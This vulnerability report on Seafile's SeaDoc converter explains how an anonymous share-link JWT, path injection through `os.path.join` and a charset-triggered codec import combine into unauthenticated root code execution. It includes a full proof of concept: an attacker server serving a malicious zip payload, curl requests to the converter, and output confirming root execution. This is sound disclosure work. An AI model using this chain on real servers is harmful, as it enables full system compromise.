# Seafile Vulnerability Report

Software: Seafile

Developer or vendor: Haiwen

Code repository: https://github.com/haiwen/seafile-server

## 1. Unauthenticated Remote Code Execution in the SeaDoc Converter

Brief description: An attacker who holds a public .sdoc share link can execute commands through the SeaDoc converter.

Affected versions: SeaDoc 2.0.x to 3.x

Preconditions: The instance has a public .sdoc share link, or a published wiki.

### Root cause

SeaDoc consists of three processes. `seahub` handles authentication and page rendering, `sdoc-server` handles collaborative editing, and `seadoc-converter` converts documents. All three share the same HMAC key, `JWT_PRIVATE_KEY`. When a visitor opens a public .sdoc share link, `seahub` embeds a JWT token in the page so that anonymous preview works.

`check_auth_token` in the converter only verifies the signature. It checks neither the document the token was issued for nor the permission the token carries:

```python
# seadoc_converter/server/apis.py:25-41    commit 79e46fdcd9
def check_auth_token(req):
    auth = req.headers.get('Authorization', '').split()
    if not auth or auth[0].lower() != 'token' or len(auth) != 2:
        return False

    token = auth[1]
    if not token:
        return False

    private_key = config.SEADOC_PRIVATE_KEY
    try:
        jwt.decode(token, private_key, algorithms=['HS256'])
    except (jwt.ExpiredSignatureError, jwt.InvalidSignatureError) as e:
        logger.exception(e)
        return False

    return True
```

Once the signature is valid, `check_auth_token` returns `True`, so the anonymous token reaches every converter endpoint and the `permission` field of the payload has no effect.

The converter exposes `/api/v1/confluence-to-wiki/`. That endpoint takes `filename` from the request body and uses it as a path:

```python
# seadoc_converter/server/apis.py:303-325    commit 79e46fdcd9
    underscore_index = filename.rfind('_')
    if underscore_index != -1:
        space_key = filename[underscore_index + 1:-len('.html.zip')]
    elif 'Confluence-space-export-' in filename:
        wiki_name = filename[:-len('.html.zip')]
        space_key = filename[len('Confluence-space-export-'):-len('.html.zip')]
    else:
        wiki_name = filename[:-len('.html.zip')]
        space_key = wiki_name
    try:
        extract_dir = '/tmp/wiki'
        space_dir = os.path.join(extract_dir, space_key)
        zip_file_path = os.path.join(extract_dir, filename)
        if not os.path.exists(extract_dir):
            os.mkdir(extract_dir)
        # Deploy on two machines
        is_same_machine = True
        if not os.path.exists(space_dir):
            os.mkdir(space_dir)
            is_same_machine = False
            response = requests.get(download_url)
            with ZipFile(BytesIO(response.content), 'r') as zip_ref:
                zip_ref.extractall(space_dir)
```

When the second argument of `os.path.join` begins with a slash, the first argument is discarded. Both `space_dir` and `zip_file_path` thus become attacker-controlled absolute paths, and the converter creates the directory and unpacks the archive there as the user it runs under. With `space_key` set to `/usr/lib/python3.12/encodings/cp273`, the `__init__.py` inside the archive lands in the `encodings` package as a subpackage named `cp273`.

The converter cleans up after the extraction in a `finally` block, but only after the result upload returns. That upload has no timeout:

```python
# seadoc_converter/converter/utils.py:221-223    commit 79e46fdcd9
    resp = requests.post(upload_url, files=files)
    if not resp.ok:
        raise Exception(f"upload zip file failed: {resp.text}")
```

The clean-up is this block:

```python
# seadoc_converter/server/apis.py:335-339    commit 79e46fdcd9
    finally:
        if not is_same_machine:
            shutil.rmtree(space_dir)
        if os.path.exists(zip_file_path):
            os.remove(zip_file_path)
```

If `upload_url` points to an address that accepts the connection and never answers, `requests.post` blocks, `finally` never runs, and the planted files stay on disk.

A file on disk does not execute by itself. `/api/v1/file-convert/` logs the upload response body when the upload fails:

```python
# seadoc_converter/server/apis.py:103-109    commit 79e46fdcd9
        resp = requests.post(upload_url,
                             data={'target_file': new_file_path, 'parent_dir': parent_dir},
                             files={'file': (file_name, file_content.encode())}
                             )
        if not resp.ok:
            logger.error(resp.text)
            return {'error_msg': resp.text}, 500
```

`Response.text` evaluates `str(self.content, encoding)`, where `encoding` comes from the `charset` parameter of the response header. If the upload address answers `500` and declares `charset=cp273`, CPython lazily imports the corresponding codec from the `encodings` package. `FileFinder` looks for the directory package `<name>/__init__.py` before the module `<name>.py`, so the import resolves to the planted `encodings/cp273/__init__.py`. Its code then runs inside the converter process, and no restart is needed.

### Reproduction environment

The lab runs the official Docker compose deployment:

```bash
mkdir seafile && cd seafile
wget https://manual.seafile.com/13.0/repo/docker/ce/env
wget https://manual.seafile.com/13.0/repo/docker/ce/seafile-server.yml
wget https://manual.seafile.com/13.0/repo/docker/ce/caddy.yml
wget https://manual.seafile.com/13.0/repo/docker/ce/seadoc.yml
docker compose up -d
```

Create an account, create a .sdoc file, and generate a public share link for it.

### Reproduction

Open the share link:

![](img/01-share-link.png)

Search the page source for `seadocAccessToken` and copy the string that follows it. This is the JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlX3V1aWQiOiIwODhlZTNlMy1hMTcxLTQ3M2YtYTNkYi01NmJjYjE0OWMwNjUiLCJmaWxlbmFtZSI6Im5vdGUuc2RvYyIsInVzZXJuYW1lIjoiQW5vbnltb3VzIiwibmFtZSI6IkFub255bW91cyIsImF2YXRhcl91cmwiOiJodHRwOi8vc2VhZmlsZS5sb2NhbC9tZWRpYS9hdmF0YXJzL2RlZmF1bHQucG5nIiwicGVybWlzc2lvbiI6InIiLCJkZWZhdWx0X3RpdGxlIjoibm90ZS5zZG9jIiwiZXhwIjoxNzkzMDcyMzU1fQ.X7G6WFnatacDI6Fg9fDT0DmkyYzv5Vgub28spPXOi3g
```

The token is a read-only anonymous credential. Its payload is:

```
{
    "file_uuid": "088ee3e3-a171-473f-a3db-56bcb149c065",
    "filename": "note.sdoc",
    "username": "Anonymous",
    "name": "Anonymous",
    "avatar_url": "http://seafile.local/media/avatars/default.png",
    "permission": "r",
    "default_title": "note.sdoc",
    "exp": 1793072355
}
```

The converter downloads an archive from `download_url` and posts the result to `upload_url`. Run a service on a host the target can reach. It provides four endpoints: `/payload.zip` returns the archive to plant, `/md` returns the markdown to convert, `/hang` accepts the connection and never answers, and `/err/<codec>` answers `500` with the given charset. The script is:

```python
import asyncio
import io
import zipfile

from fastapi import FastAPI, Response
from fastapi.responses import PlainTextResponse


def build_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('__init__.py',
                   "import os\n"
                   "if os.fork() == 0:\n"
                   "    os.system('id > /root/pwned; hostname >> /root/pwned')\n"
                   "    os._exit(0)\n")
        z.writestr('page.html',
                   '<html><body><div id="main-content"><h1>Hello</h1>'
                   '<p>world</p></div></body></html>')
    return buf.getvalue()


ZIP = build_zip()
app = FastAPI()


@app.get('/payload.zip')
def payload():
    return Response(ZIP, media_type='application/zip')


@app.get('/md')
def md():
    return PlainTextResponse('# hello\n\nworld\n')


@app.post('/hang')
async def hang():
    await asyncio.sleep(3600)


@app.post('/err/{codec}')
def err(codec: str):
    return Response('boom', status_code=500,
                    media_type='text/plain; charset=%s' % codec)
```

In the commands below, `192.0.2.10` stands for that host and `18099` for its port. Start the service:

```bash
uvicorn attacker_server:app --host 0.0.0.0 --port 18099
```

Send a request to `confluence-to-wiki` with `filename` set to `/usr/lib/python3.12/encodings/cp273aaaaaaaaa` and `upload_url` pointing at `/hang`. The request does not return:

```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlX3V1aWQiOiIwODhlZTNlMy1hMTcxLTQ3M2YtYTNkYi01NmJjYjE0OWMwNjUiLCJmaWxlbmFtZSI6Im5vdGUuc2RvYyIsInVzZXJuYW1lIjoiQW5vbnltb3VzIiwibmFtZSI6IkFub255bW91cyIsImF2YXRhcl91cmwiOiJodHRwOi8vc2VhZmlsZS5sb2NhbC9tZWRpYS9hdmF0YXJzL2RlZmF1bHQucG5nIiwicGVybWlzc2lvbiI6InIiLCJkZWZhdWx0X3RpdGxlIjoibm90ZS5zZG9jIiwiZXhwIjoxNzkzMDcyMzU1fQ.X7G6WFnatacDI6Fg9fDT0DmkyYzv5Vgub28spPXOi3g'
curl -s -X POST http://seafile.local/sdoc-server/converter/api/v1/confluence-to-wiki/ \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename":"/usr/lib/python3.12/encodings/cp273aaaaaaaaa","download_url":"http://192.0.2.10:18099/payload.zip","upload_url":"http://192.0.2.10:18099/hang","username":"demo"}'
```

The files are on disk inside the seadoc container while the request stays blocked:

```bash
$ ls -l /usr/lib/python3.12/encodings/cp273/
total 20
-rw-r--r-- 1 root root  104 Oct 24 03:43 __init__.py
drwxr-xr-x 2 root root 4096 Oct 24 03:43 md_output
drwxr-xr-x 2 root root 4096 Oct 24 03:43 __pycache__
-rw-r--r-- 1 root root  563 Oct 24 03:43 sdoc_archive.zip
drwxr-xr-x 2 root root 4096 Oct 24 03:43 sdoc_output
```

Then send a request to `file-convert` with `upload_url` pointing at `/err/cp273`:

```bash
curl -s -X POST http://seafile.local/sdoc-server/converter/api/v1/file-convert/ \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/x.md","src_type":"markdown","dst_type":"sdoc","username":"demo","doc_uuid":"088ee3e3-a171-473f-a3db-56bcb149c065","download_url":"http://192.0.2.10:18099/md","upload_url":"http://192.0.2.10:18099/err/cp273"}'
```

The response is:

```
{"error_msg":"boom"}
```

The command has run on the server:

```bash
$ cat /root/pwned
uid=0(root) gid=0(root) groups=0(root)
508640b9e839
```
